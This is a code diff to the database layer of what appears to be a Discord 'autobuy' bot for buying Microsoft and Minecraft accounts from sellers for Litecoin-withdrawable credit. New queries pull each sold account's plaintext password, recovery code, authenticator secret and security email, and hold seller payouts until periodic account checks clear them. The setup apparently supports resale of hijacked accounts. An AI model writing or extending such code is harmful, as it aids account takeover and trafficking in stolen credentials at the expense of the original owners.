@@ -93,7 +93,11 @@ class DBConnection:
                 available_at TIMESTAMP NOT NULL,
                 created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                 source TEXT,
-                email TEXT
+                email TEXT,
+                status TEXT NOT NULL DEFAULT 'holding',
+                void_reason TEXT,
+                last_checked_at TIMESTAMP,
+                next_check_at TIMESTAMP
             );
 
             CREATE TABLE IF NOT EXISTS `autobuy_sells` (
@@ -102,6 +106,7 @@ class DBConnection:
                 email TEXT NOT NULL,
                 success INTEGER NOT NULL DEFAULT 0,
                 credit_id INTEGER,
+                account_id TEXT,
                 created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
             );
 
@@ -116,8 +121,40 @@ class DBConnection:
                 error TEXT,
                 created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
             );
+
+            CREATE TABLE IF NOT EXISTS `autobuy_panels` (
+                message_id INTEGER PRIMARY KEY,
+                channel_id INTEGER NOT NULL,
+                guild_id INTEGER,
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            );
         """)
         self.conn.commit()
+        # Migrations for older DBs
+        for stmt in (
+            "ALTER TABLE autobuy_sells ADD COLUMN account_id TEXT",
+            "ALTER TABLE autobuy_credits ADD COLUMN status TEXT NOT NULL DEFAULT 'holding'",
+            "ALTER TABLE autobuy_credits ADD COLUMN void_reason TEXT",
+            "ALTER TABLE autobuy_credits ADD COLUMN last_checked_at TIMESTAMP",
+            "ALTER TABLE autobuy_credits ADD COLUMN next_check_at TIMESTAMP",
+        ):
+            try:
+                self.cursor.execute(stmt)
+                self.conn.commit()
+            except Exception:
+                pass
+        # Existing holding credits with no schedule: check ASAP
+        try:
+            self.cursor.execute("""
+                UPDATE autobuy_credits
+                SET status = 'holding',
+                    next_check_at = COALESCE(next_check_at, CURRENT_TIMESTAMP)
+                WHERE remaining_usd > 0
+                  AND COALESCE(status, 'holding') NOT IN ('voided', 'cleared')
+            """)
+            self.conn.commit()
+        except Exception:
+            pass
 
     # Security Emails
     def add_security_email(self, email: str, pwd: str) -> None:
@@ -456,12 +493,14 @@ class DBConnection:
         available_at: str,
         source: str,
         email: str,
+        next_check_at: str | None = None,
     ) -> int:
         self.cursor.execute("""
             INSERT INTO autobuy_credits
-                (discord_id, amount_usd, remaining_usd, available_at, source, email)
-            VALUES (?, ?, ?, ?, ?, ?)
-        """, (discord_id, amount_usd, amount_usd, available_at, source, email))
+                (discord_id, amount_usd, remaining_usd, available_at, source, email,
+                 status, next_check_at)
+            VALUES (?, ?, ?, ?, ?, ?, 'holding', COALESCE(?, CURRENT_TIMESTAMP))
+        """, (discord_id, amount_usd, amount_usd, available_at, source, email, next_check_at))
         self.conn.commit()
         return int(self.cursor.lastrowid)
 
@@ -471,11 +510,12 @@ class DBConnection:
         email: str,
         success: bool,
         credit_id: int | None = None,
+        account_id: str | None = None,
     ) -> None:
         self.cursor.execute("""
-            INSERT INTO autobuy_sells (discord_id, email, success, credit_id)
-            VALUES (?, ?, ?, ?)
-        """, (discord_id, email, 1 if success else 0, credit_id))
+            INSERT INTO autobuy_sells (discord_id, email, success, credit_id, account_id)
+            VALUES (?, ?, ?, ?, ?)
+        """, (discord_id, email, 1 if success else 0, credit_id, account_id))
         self.conn.commit()
 
     def autobuy_sells_today(self, discord_id: int) -> int:
@@ -488,33 +528,41 @@ class DBConnection:
         return int(row[0] or 0)
 
     def autobuy_balances(self, discord_id: int) -> dict:
+        # pending = still in hold / awaiting periodic account checks
         pending = self.cursor.execute("""
             SELECT COALESCE(SUM(remaining_usd), 0) FROM autobuy_credits
             WHERE discord_id = ?
               AND remaining_usd > 0
-              AND available_at > CURRENT_TIMESTAMP
+              AND COALESCE(status, 'holding') = 'holding'
         """, (discord_id,)).fetchone()[0]
+        # available = passed hold checks and cleared for withdraw
         available = self.cursor.execute("""
             SELECT COALESCE(SUM(remaining_usd), 0) FROM autobuy_credits
             WHERE discord_id = ?
               AND remaining_usd > 0
-              AND available_at <= CURRENT_TIMESTAMP
+              AND status = 'cleared'
+        """, (discord_id,)).fetchone()[0]
+        voided = self.cursor.execute("""
+            SELECT COALESCE(SUM(amount_usd), 0) FROM autobuy_credits
+            WHERE discord_id = ?
+              AND status = 'voided'
         """, (discord_id,)).fetchone()[0]
         return {
             "pending_usd": float(pending or 0),
             "available_usd": float(available or 0),
+            "voided_usd": float(voided or 0),
             "total_usd": float(pending or 0) + float(available or 0),
         }
 
     def autobuy_consume_credits(self, discord_id: int, amount_usd: float) -> list[tuple[int, float]]:
-        """Consume available credits FIFO. Returns list of (credit_id, taken_usd)."""
+        """Consume cleared credits FIFO. Returns list of (credit_id, taken_usd)."""
         if amount_usd <= 0:
             return []
         rows = self.cursor.execute("""
             SELECT id, remaining_usd FROM autobuy_credits
             WHERE discord_id = ?
               AND remaining_usd > 0
-              AND available_at <= CURRENT_TIMESTAMP
+              AND status = 'cleared'
             ORDER BY available_at ASC, id ASC
         """, (discord_id,)).fetchall()
 
@@ -554,6 +602,91 @@ class DBConnection:
             )
         self.conn.commit()
 
+    def autobuy_credits_due_for_check(self, limit: int = 25) -> list[dict]:
+        """Holding credits whose next_check_at is due, with secured login creds."""
+        rows = self.cursor.execute("""
+            SELECT
+                c.id,
+                c.discord_id,
+                c.email,
+                c.amount_usd,
+                c.remaining_usd,
+                c.available_at,
+                c.status,
+                c.next_check_at,
+                s.account_id AS sell_account_id,
+                sa.account_id,
+                sa.ms_email,
+                sa.ms_password
+            FROM autobuy_credits c
+            LEFT JOIN autobuy_sells s
+                ON s.credit_id = c.id AND s.success = 1
+            LEFT JOIN secured_accounts sa ON (
+                (s.account_id IS NOT NULL AND sa.account_id = s.account_id)
+                OR (
+                    (s.account_id IS NULL OR s.account_id = '')
+                    AND LOWER(sa.ms_email) = LOWER(c.email)
+                )
+            )
+            WHERE COALESCE(c.status, 'holding') = 'holding'
+              AND c.remaining_usd > 0
+              AND (c.next_check_at IS NULL OR c.next_check_at <= CURRENT_TIMESTAMP)
+            ORDER BY COALESCE(c.next_check_at, c.created_at) ASC, c.id ASC
+            LIMIT ?
+        """, (limit,)).fetchall()
+        keys = [
+            "id", "discord_id", "email", "amount_usd", "remaining_usd",
+            "available_at", "status", "next_check_at", "sell_account_id",
+            "account_id", "ms_email", "ms_password",
+        ]
+        return [dict(zip(keys, row)) for row in rows]
+
+    def autobuy_mark_credit_checked(
+        self,
+        credit_id: int,
+        *,
+        next_check_at: str | None,
+        clear: bool = False,
+    ) -> None:
+        if clear:
+            self.cursor.execute("""
+                UPDATE autobuy_credits
+                SET status = 'cleared',
+                    last_checked_at = CURRENT_TIMESTAMP,
+                    next_check_at = NULL,
+                    void_reason = NULL
+                WHERE id = ? AND COALESCE(status, 'holding') = 'holding'
+            """, (credit_id,))
+        else:
+            self.cursor.execute("""
+                UPDATE autobuy_credits
+                SET last_checked_at = CURRENT_TIMESTAMP,
+                    next_check_at = ?
+                WHERE id = ? AND COALESCE(status, 'holding') = 'holding'
+            """, (next_check_at, credit_id))
+        self.conn.commit()
+
+    def autobuy_void_credit(self, credit_id: int, reason: str) -> float:
+        """Void a holding credit. Returns voided remaining_usd (0 if already gone)."""
+        row = self.cursor.execute("""
+            SELECT remaining_usd FROM autobuy_credits
+            WHERE id = ? AND COALESCE(status, 'holding') = 'holding'
+        """, (credit_id,)).fetchone()
+        if not row:
+            return 0.0
+        remaining = float(row[0] or 0)
+        self.cursor.execute("""
+            UPDATE autobuy_credits
+            SET status = 'voided',
+                remaining_usd = 0,
+                void_reason = ?,
+                last_checked_at = CURRENT_TIMESTAMP,
+                next_check_at = NULL
+            WHERE id = ? AND COALESCE(status, 'holding') = 'holding'
+        """, (reason[:500], credit_id))
+        self.conn.commit()
+        return remaining
+
     def autobuy_add_withdrawal(
         self,
         discord_id: int,
@@ -590,3 +723,102 @@ class DBConnection:
             WHERE id = ?
         """, (status, txid, amount_ltc, error, withdrawal_id))
         self.conn.commit()
+
+    def autobuy_add_panel(self, message_id: int, channel_id: int, guild_id: int | None = None) -> None:
+        self.cursor.execute("""
+            INSERT OR REPLACE INTO autobuy_panels (message_id, channel_id, guild_id)
+            VALUES (?, ?, ?)
+        """, (message_id, channel_id, guild_id))
+        self.conn.commit()
+
+    def autobuy_upsert_panel(self, message_id: int, channel_id: int, guild_id: int | None = None) -> None:
+        self.autobuy_add_panel(message_id, channel_id, guild_id)
+
+    def autobuy_list_panels(self) -> list[dict]:
+        rows = self.cursor.execute("""
+            SELECT message_id, channel_id, guild_id FROM autobuy_panels
+        """).fetchall()
+        return [
+            {"message_id": r[0], "channel_id": r[1], "guild_id": r[2]}
+            for r in rows
+        ]
+
+    def autobuy_remove_panel(self, message_id: int) -> None:
+        self.cursor.execute(
+            "DELETE FROM autobuy_panels WHERE message_id = ?",
+            (message_id,),
+        )
+        self.conn.commit()
+
+    def get_autobuy_secured_accounts(self) -> list[dict]:
+        """Accounts sold via autobuy (successful sells), with seller metadata."""
+        # Prefer account_id join; fall back to email match for older rows
+        rows = self.cursor.execute("""
+            SELECT
+                abs.id AS sell_id,
+                abs.discord_id AS seller_discord_id,
+                abs.email AS sell_email,
+                abs.created_at AS sold_at,
+                abs.credit_id,
+                abs.account_id AS sell_account_id,
+                ac.amount_usd,
+                au.ltc_address AS seller_ltc,
+                sa.account_id,
+                sa.ms_email,
+                sa.ms_security_email,
+                sa.ms_password,
+                sa.ms_recovery_code,
+                sa.ms_auth_secret,
+                sa.mc_name,
+                sa.mc_method,
+                sa.mc_gamertag,
+                sa.mc_capes,
+                sa.secured_at
+            FROM autobuy_sells abs
+            LEFT JOIN autobuy_credits ac ON ac.id = abs.credit_id
+            LEFT JOIN autobuy_users au ON au.discord_id = abs.discord_id
+            LEFT JOIN secured_accounts sa ON (
+                (abs.account_id IS NOT NULL AND sa.account_id = abs.account_id)
+                OR (
+                    abs.account_id IS NULL
+                    AND LOWER(sa.ms_email) = LOWER(abs.email)
+                )
+            )
+            WHERE abs.success = 1
+            ORDER BY abs.created_at DESC
+            LIMIT 500
+        """).fetchall()
+
+        keys = [
+            "sell_id", "seller_discord_id", "sell_email", "sold_at", "credit_id",
+            "sell_account_id", "amount_usd", "seller_ltc",
+            "account_id", "ms_email", "ms_security_email", "ms_password",
+            "ms_recovery_code", "ms_auth_secret",
+            "mc_name", "mc_method", "mc_gamertag", "mc_capes", "secured_at",
+        ]
+        seen: set[str] = set()
+        out: list[dict] = []
+        for row in rows:
+            item = dict(zip(keys, row))
+            # Dedupe by sell_id (one row per sell); if email join matched multiple
+            # secured_accounts, SQLite may return multiples — keep first (newest secure).
+            sell_key = f"sell:{item['sell_id']}"
+            if sell_key in seen:
+                continue
+            seen.add(sell_key)
+            if not item.get("account_id"):
+                item["account_id"] = item.get("sell_account_id") or f"sell-{item['sell_id']}"
+            if not item.get("ms_email"):
+                item["ms_email"] = item.get("sell_email") or "Unknown"
+            if not item.get("mc_name"):
+                item["mc_name"] = "—"
+            if not item.get("mc_method"):
+                item["mc_method"] = "—"
+            if not item.get("mc_gamertag"):
+                item["mc_gamertag"] = "—"
+            if not item.get("mc_capes"):
+                item["mc_capes"] = "—"
+            if not item.get("secured_at"):
+                item["secured_at"] = item.get("sold_at")
+            out.append(item)
+        return out
